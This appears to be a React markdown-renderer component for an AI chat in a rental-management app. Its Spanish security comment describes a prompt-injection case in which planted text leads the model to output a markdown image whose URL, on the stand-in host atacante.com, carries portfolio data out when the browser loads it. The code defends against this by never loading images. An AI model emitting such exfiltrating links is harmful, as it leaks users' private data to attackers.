'use client';

import { useRef, type ReactNode } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import type { Components } from 'react-markdown';
import { cn } from '@/lib/utils';
import { rehypeRevelar } from '@/lib/chat/rehype-revelar';
import { prefiereMenosMovimiento } from '@/lib/chat/revelado';

interface MarkdownRendererProps {
  content: string;
  className?: string;
  /** When true, appends a blinking cursor after the content */
  isStreaming?: boolean;
}

/**
 * ── Por qué no se pintan imágenes y los enlaces dicen adónde van ──────────
 * (auditoría de seguridad 23-09). Lo que pinta este componente lo escribe un
 * modelo, y un modelo se puede manipular con texto que él mismo lee (una nota
 * de un inquilino, el nombre de un inmueble importado, un correo). La jugada
 * clásica es que responda `![](https://atacante.com/x?d=<datos del snapshot>)`:
 * el navegador pide esa imagen SOLO, sin clic, y los datos de la cartera salen
 * en la URL. Por eso:
 *   - una imagen NO se carga nunca: se muestra como texto con su destino;
 *   - un enlace a otro sitio muestra su dominio al lado, para que un «Ver
 *     estado de cuenta» que en realidad va a otro lado se vea antes del clic.
 * Es la segunda puerta: el micro ya quita las imágenes de la respuesta
 * (`nico8/sec-ia`) y la CSP (`img-src`) cierra los orígenes.
 */

/**
 * El dominio (y el comienzo de la ruta) de un enlace que sale de Leasefy, o
 * `null` si es interno (`/panel/...`, `#ancla`) o no se puede leer.
 */
export function destinoExterno(href: string | undefined | null): string | null {
  if (!href) return null;
  const crudo = href.trim();
  if (crudo.startsWith('/') && !crudo.startsWith('//')) return null;
  if (crudo.startsWith('#')) return null;
  // Se resuelve contra nuestro origen: así `//otro.sitio/x` (sin esquema)
  // también cuenta como externo, y lo relativo queda en casa.
  const base =
    typeof window !== 'undefined' && window.location?.origin && window.location.origin !== 'null'
      ? window.location.origin
      : 'https://leasefy.invalid';
  let url: URL;
  try {
    url = new URL(crudo, base);
  } catch {
    return null;
  }
  if (url.protocol === 'mailto:' || url.protocol === 'tel:') return url.href.slice(url.protocol.length);
  if (url.origin === new URL(base).origin) return null;
  const ruta = url.pathname === '/' ? '' : url.pathname;
  const corta = ruta.length > 30 ? `${ruta.slice(0, 30)}…` : ruta;
  return `${url.hostname}${corta}`;
}

/**
 * Custom component overrides for chat-context markdown.
 * Tighter spacing, chat-appropriate sizing, dark mode compatible.
 */
const markdownComponents: Components = {
  p: ({ children }) => (
    <p className="mb-2 last:mb-0 leading-relaxed">{children}</p>
  ),
  ul: ({ children }) => (
    <ul className="mb-2 last:mb-0 ml-4 list-disc space-y-1">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="mb-2 last:mb-0 ml-4 list-decimal space-y-1">{children}</ol>
  ),
  li: ({ children }) => (
    <li className="leading-relaxed">{children}</li>
  ),
  strong: ({ children }) => (
    <strong className="font-semibold">{children}</strong>
  ),
  em: ({ children }) => (
    <em className="italic">{children}</em>
  ),
  a: ({ href, children }) => {
    const destino = destinoExterno(href);
    return (
      <a
        href={href}
        className="text-primary hover:underline"
        target="_blank"
        rel="noopener noreferrer"
        title={destino ? href : undefined}
      >
        {children}
        {destino && (
          <span className="ml-1 font-mono text-[14px] text-muted-foreground">({destino})</span>
        )}
      </a>
    );
  },
  // Ninguna imagen se carga: se dice que había una y adónde apuntaba. Ver
  // «Por qué no se pintan imágenes» abajo.
  img: ({ src, alt }) => {
    const url = typeof src === 'string' ? src : undefined;
    const destino = destinoExterno(url) ?? url;
    return (
      <span className="text-muted-foreground">
        [Imagen{alt ? `: ${alt}` : ''}
        {destino && <span className="ml-1 font-mono text-[14px]">({destino})</span>}]
      </span>
    );
  },
  code: ({ className, children, ...props }) => {
    // Detect code blocks (have a language className from react-markdown)
    const isBlock = className?.startsWith('language-');
    if (isBlock) {
      return (
        <code
          className={cn(
            'bg-muted/70 dark:bg-muted/50 p-3 rounded-md text-[14px] font-mono',
            'overflow-x-auto block',
            className
          )}
          {...props}
        >
          {children}
        </code>
      );
    }
    // Inline code
    return (
      <code
        className="bg-muted/70 dark:bg-muted/50 px-1.5 py-0.5 rounded text-[14px] font-mono"
        {...props}
      >
        {children}
      </code>
    );
  },
  pre: ({ children }) => (
    <pre className="mb-2 last:mb-0 overflow-x-auto">{children}</pre>
  ),
  table: ({ children }) => (
    <div className="mb-2 last:mb-0 overflow-x-auto">
      <table className="border-collapse w-full text-[14px]">{children}</table>
    </div>
  ),
  thead: ({ children }) => (
    <thead className="border-b border-border">{children}</thead>
  ),
  th: ({ children }) => (
    <th className="px-2 py-1.5 text-left font-semibold text-muted-foreground">
      {children}
    </th>
  ),
  td: ({ children }) => (
    <td className="px-2 py-1.5 border-b border-border/50">{children}</td>
  ),
  blockquote: ({ children }) => (
    <blockquote className="border-l-2 border-primary/30 pl-3 mb-2 last:mb-0 text-muted-foreground italic">
      {children}
    </blockquote>
  ),
  hr: () => (
    <hr className="border-border my-3" />
  ),
  h1: ({ children }) => (
    <h3 className="font-semibold text-[17.5px] mb-1.5">{children}</h3>
  ),
  h2: ({ children }) => (
    <h3 className="font-semibold text-[17px] mb-1.5">{children}</h3>
  ),
  h3: ({ children }) => (
    <h3 className="font-semibold text-[16px] mb-1">{children}</h3>
  ),
};

/*
 * El fundido del texto recién revelado. Dos componentes DISTINTOS a propósito:
 * `rehypeRevelar` alterna la etiqueta en cada bloque para que React monte un
 * elemento nuevo y la animación vuelva a correr (ver el plugin).
 */
const CLASE_REVELADO = 'animate-in fade-in duration-300 ease-out motion-reduce:animate-none';
function RevelarA({ children }: { children?: ReactNode }) {
  return <span className={CLASE_REVELADO}>{children}</span>;
}
function RevelarB({ children }: { children?: ReactNode }) {
  return <span className={CLASE_REVELADO}>{children}</span>;
}
const componentesConRevelado = {
  ...markdownComponents,
  'revelar-a': RevelarA,
  'revelar-b': RevelarB,
} as Components;

/**
 * Desde dónde fundir: si el texto creció en más de un carácter desde el cuadro
 * anterior, lo nuevo es un BLOQUE (fase acelerada del revelado) y se funde. Una
 * sola letra más es el tecleo de siempre: no necesita fundido.
 */
function useRevelado(content: string, isStreaming: boolean) {
  const previo = useRef({ largo: 0, desde: null as number | null, bloques: 0 });
  const r = previo.current;
  if (!isStreaming) {
    r.largo = content.length;
    r.desde = null;
  } else if (content.length !== r.largo) {
    const crecio = content.length - r.largo;
    r.desde = crecio > 1 && r.largo > 0 && !prefiereMenosMovimiento() ? r.largo : null;
    if (r.desde !== null) r.bloques += 1;
    r.largo = content.length;
  }
  return { desde: r.desde, etiqueta: r.bloques % 2 === 0 ? 'revelar-a' : 'revelar-b' };
}

/**
 * MarkdownRenderer - Renders markdown content in chat bubbles.
 *
 * Uses react-markdown with custom Tailwind-styled component overrides
 * for chat-appropriate sizing and spacing. Dark mode compatible.
 *
 * When isStreaming is true, appends a blinking cursor after content.
 */
export function MarkdownRenderer({
  content,
  className,
  isStreaming = false,
}: MarkdownRendererProps) {
  const revelado = useRevelado(content, isStreaming);
  return (
    <div
      className={cn(
        'prose dark:prose-invert max-w-none',
        // Override prose defaults for chat context
        'prose-p:my-0 prose-headings:my-0',
        'prose-ul:my-0 prose-ol:my-0 prose-li:my-0',
        'prose-pre:my-0 prose-table:my-0',
        'prose-blockquote:my-0',
        // 16px ES el tamaño del cuerpo de las respuestas (Nico, 2026-08-27).
        // Vivía en los contenedores (AssistantBubble, ResponseCard) y NO se
        // veía: acá adentro `prose-sm` + `text-[14px]` lo pisaban, porque el
        // texto lo dibuja este componente, no el div de afuera. El tamaño
        // vive ahora en un solo lugar — el que renderiza — y `className`
        // sigue pudiendo cambiarlo puntualmente (tailwind-merge deduplica).
        'text-[16px] leading-[1.6]',
        className
      )}
    >
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={revelado.desde !== null ? [[rehypeRevelar, revelado]] : []}
        components={revelado.desde !== null ? componentesConRevelado : markdownComponents}
      >
        {content}
      </ReactMarkdown>
      {/* Sin cursor de streaming (Nico, 2026-08-27: «esa barra azul que da como
          abajo no debería ir ahí, se ve súper raro»). Era un `inline-block`
          agregado DESPUÉS del markdown, y como el markdown cierra en un <p> de
          bloque, el cursor caía a una línea propia: una rayita azul suelta con
          su renglón de aire debajo del texto. Además ya no hace falta — el
          orbe del avatar dice que se está generando, y lo dice mejor. */}
    </div>
  );
}
